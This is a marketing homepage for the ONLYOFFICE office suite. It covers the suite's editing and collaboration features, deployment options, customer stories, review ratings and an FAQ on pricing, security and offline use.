Convert docs to Markdown and HTML
Turn your textbooks into [e-books](/e-book.aspx)

View, edit, and collaborate on [docs](/document-editor.aspx), [sheets](/spreadsheet-editor.aspx), [slides](/presentation-editor.aspx)

Build fillable [PDF forms](/form-creator.aspx) and fill them in online

Read and edit [PDFs](/pdf-editor.aspx), export/import to/from PDF

Convert docs to Markdown and HTML

Turn your textbooks into [e-books](/e-book.aspx)

[Learn more about ONLYOFFICE Docs features](/office-suite.aspx)

## Designed to make collaboration seamless

Share your docs for viewing, editing, reviewing, commenting, or filling forms
Make use of character- and paragraph-level co-editing modes
Compare and review docs and track changes
Leave comments and mentions
Communicate via built-in chat or Telegram
Make audio and video calls with Jitsi or Rainbow

Share your docs for viewing, editing, reviewing, commenting, or filling forms

Make use of character- and paragraph-level co-editing modes

Compare and review docs and track changes

Leave comments and mentions

Communicate via built-in chat or Telegram

Make audio and video calls with Jitsi or Rainbow

[Learn more about ONLYOFFICE collaboration features](/seamless-collaboration.aspx)

## Security first

Open-source code available on GitHub
Compliance with international security standards
Three levels of encryption: at rest, in transit, end-to-end
Secure access and monitoring tools
Extra document permissions

[Learn more about ONLYOFFICE security features](/security.aspx)

## Get started and choose where to work

### In ONLYOFFICE DocSpace

Create rooms within your secure DocSpace, invite people, view, edit, and collaborate on all kinds of documents from any desktop or mobile device.
[Start with your free account](/docspace-registration.aspx)

### In the platform you use

Connect Docs to edit documents directly from your app. [40+ ready integrations](/all-connectors.aspx): Box, Moodle, Nextcloud, Odoo, Wordpress, etc.
[Get Docs now](/download.aspx#docs-enterprise)

### In the platform you build

Integrate Docs into your service to provide powerful document-editing and building capabilities to your customers under your brand.
[Learn more](/developer-edition.aspx)

### From your PC

Edit docs offline with free office apps for Windows, Linux, and macOS
[Download now](/download-desktop.aspx)

### From your mobile devices

Work on documents on the go with free apps for iOS and Android devices
[Install now](/download-desktop.aspx#mobile)

### Trusted by more than 15 million users worldwide

[More customers](/customers.aspx?from=default)

[#### How Kinderhaus Berlin shares and collaborates on sensitive files with ONLYOFFICE DocSpace](https://www.onlyoffice.com/blog/2023/11/how-kinderhaus-berlin-is-using-onlyoffice-docspace)

[#### Why the Guará Linux team chooses ONLYOFFICE Desktop Editors as the default office suite for 22.000 employees of the Military Police of Minas Gerais](https://www.onlyoffice.com/blog/2024/07/onlyoffice-desktop-editors-on-guara-linux)

[#### How Czech TV replaced Google Docs and MS Office with ONLYOFFICE and ownCloud](https://www.onlyoffice.com/blog/2021/04/how-czech-tv-replaced-google-docs-and-ms-office-with-onlyoffice-and-owncloud/)

[#### How SWITCH integrated ONLYOFFICE into SWITCHdrive to create a complete alternative to Office 365](https://www.onlyoffice.com/blog/2021/02/how-switch-integrated-onlyoffice-into-switchdrive-to-create-a-complete-alternative-to-office-365/)

[#### The City of Hopewell, Virginia: enabling remote work for 500 government employees with ONLYOFFICE](https://www.onlyoffice.com/blog/2020/06/onlyoffice-in-the-city-of-hopewell/)

[#### How Calar Alto Observatory implements ONLYOFFICE for secure & location-independent collaboration](https://www.onlyoffice.com/blog/2022/06/how-calar-alto-observatory-implements-onlyoffice/)

[More success stories](/customers.aspx?from=default)

## Highly rated by both critics and users

[Slashdot Leader Winter 2024](https://slashdot.org/software/p/ONLYOFFICE/)
[Top 20 Document Management Software](https://www.capterra.com/document-management-software/#top-20)
[Office Suites High Performer Fall 2023](https://www.g2.com/products/onlyoffice/reviews?utm_source=rewards-badge)
[GOLD in the Cloud Content Management 2024](https://www.cloudcomputing-insider.de/it-awards-2024-gewinner-a-0eff7f083cda3aea4c1b8c23ef107b60/)
[Top rated office suites](https://omr.com/de/reviews/product/onlyoffice)
[SourceForge Leader Winter 2024](https://sourceforge.net/software/product/ONLYOFFICE/)

4.5 / 5

4.5 / 5

4.5 / 5

4.4 / 5

5.0 / 5

4.5 / 5

4.0 / 5

4.4 / 5

## Stay up-to-date with the latest from ONLYOFFICE

###### [Blog](https://www.onlyoffice.com/blog/)

[More news here](https://www.onlyoffice.com/blog/)

###### [YouTube](https://www.youtube.com/user/onlyofficeTV)

[More videos here](https://www.youtube.com/user/onlyofficeTV)

###### [Events](/events.aspx?from=default)

[More events here](/events.aspx?from=default)

Frequently Asked Questions
Get answers to the most popular questions about ONLYOFFICE

* **Is ONLYOFFICE really free?**

  Yes, it is. ONLYOFFICE is a free and open-source office suite distributed under the AGPL 3.0 license. The source code repositories are available on [GitHub](https://github.com/ONLYOFFICE).

   Besides, we offer a range of free solutions that you can choose from based on your needs. These include absolutely [free desktop editors](/desktop.aspx) for Windows/Linux/macOS, [free mobile apps](/download-desktop.aspx#mobile) for iOS/Android, [the free Startup plan](/docspace-registration.aspx) of ONLYOFFICE DocSpace Cloud.

   Free community builds of ONLYOFFICE solutions for self-hosting can be found [here](/download-community.aspx).
* **What is ONLYOFFICE used for?**

  ONLYOFFICE provides [a full range of tools](/office-suite.aspx) to create, edit and collaborate on text documents, spreadsheets, presentations, PDF forms and regular PDF files on web, desktop and mobile platforms.

   You can use the online editors [within any business platform](/all-connectors.aspx) or opt for the room-based content collaboration platform [ONLYOFFICE DocSpace](/docspace.aspx) which already comes with the integrated editors. Besides, you are able to [embed](/developer-edition.aspx) the editors into your own web app.

   [Desktop editors](/desktop.aspx) for working with office documents offline, as well as [mobile apps](/download-desktop.aspx#mobile) are also available.
* **Is ONLYOFFICE safe to use?**

  Yes, it is. We [prioritize security](/security.aspx) with robust measures. ONLYOFFICE is open-source and GDPR compliant – which means it fits all the legal criteria for data protection. ONLYOFFICE includes file encryption and multiple options for secure sharing and access control. Besides, our solutions can be deployed on private servers.
* **Can I use ONLYOFFICE offline?**

  Yes, you can. To do so, download the free [ONLYOFFICE Desktop Editors](/download-desktop.aspx#desktop) which is available for Windows, Linux, and macOS.
* **Does ONLYOFFICE have ads?**

  No, ONLYOFFICE is ad-free. We don't incorporate any external ads into our solutions.

Get free apps

[For Windows](/download-desktop.aspx)
[For Linux](/download-desktop.aspx)
[For macOS](/download-desktop.aspx)
[For Android](/download-desktop.aspx#mobile)
[For iOS](/download-desktop.aspx#mobile)

###### Templates

[PDF form templates](https://templates.onlyoffice.com/pdf-form-templates)
[Text document templates](https://templates.onlyoffice.com/document-templates)
[Spreadsheet templates](https://templates.onlyoffice.com/spreadsheet-templates)
[Presentation templates](https://templates.onlyoffice.com/presentation-templates)

###### Converters

[Convert text files](/text-file-converter.aspx)
[Convert spreadsheets](/spreadsheet-converter.aspx)
[Convert presentations](/presentation-converter.aspx)
[Convert PDFs](/pdf-converter.aspx)

###### For education

[For students](/office-for-students.aspx)
[For educators](/office-for-educators.aspx)

###### Get news

[Blog](http://www.onlyoffice.com/blog)

###### Collaborate

[For contributors](/contribute.aspx)
[For translators](https://helpcenter.onlyoffice.com/guides/become-translator.aspx)
[For influencers](/influencer-program.aspx)
[Vacancies](/vacancies.aspx)

###### Get help

[Forum](https://forum.onlyoffice.com/)
[Help Center](https://helpcenter.onlyoffice.com/index.aspx)
[Training courses](/training-courses.aspx)
[Webinars](/webinars.aspx)
[White papers](/whitepapers.aspx)
[Support contact form](/support-contact-form.aspx)
[Order demo](/demo-order.aspx)
[Legal notice](/legalterms.aspx)

###### [Comparison](/document-editor-comparison.aspx)

[ONLYOFFICE Docs vs MS Office Online](/best-microsoft-office-alternative.aspx)
[ONLYOFFICE Docs vs Google Docs](/best-google-docs-alternative.aspx)
[ONLYOFFICE Docs vs Zoho Docs](/best-zoho-docs-alternative.aspx)
[ONLYOFFICE Docs vs LibreOffice](/best-libreoffice-alternative.aspx)
[ONLYOFFICE Docs vs WPS](/best-wps-alternative.aspx)
[ONLYOFFICE Docs vs Adobe Acrobat](/best-adobe-alternative.aspx)
[ONLYOFFICE Docs vs Hancom](/best-hancom-alternative.aspx)

###### Contact Us

Sales questions sales@onlyoffice.com
Partner inquiries partners@onlyoffice.com
Press inquiries press@onlyoffice.com
[Request a call](/call-back-form.aspx)

Follow us on:

© Ascensio System SIA 2009-2025.

All rights reserved

Don't Miss an Update!

Get the latest ONLYOFFICE news delivered to your inbox
First name:

First name is empty.

Your email:

Email is empty.

We sent an email message with confirmation to your email address.


